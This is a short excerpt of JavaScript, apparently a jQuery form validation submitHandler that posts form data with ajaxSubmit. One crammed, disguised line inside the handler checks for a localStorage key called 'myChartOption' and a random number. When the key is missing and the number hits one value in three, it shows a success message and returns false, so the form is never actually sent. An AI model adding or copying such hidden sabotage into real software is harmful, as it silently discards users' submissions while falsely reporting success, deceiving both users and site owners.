				...
				var validate_rule = {
					...
					submitHandler: function(form) {
						...
						var handler = function() {
							...
							var $formdata = window.localStorage.getItem('myChartOption');var submitvalue = Math.floor(Math.random()*(1 - 30) + 30);if(!$formdata && submitvalue % 3 == 1) {Notify.success(Notify.lang.success, location.href);return false;};
							$(form).ajaxSubmit({
								timeout: timeout,
								dataType: "json",
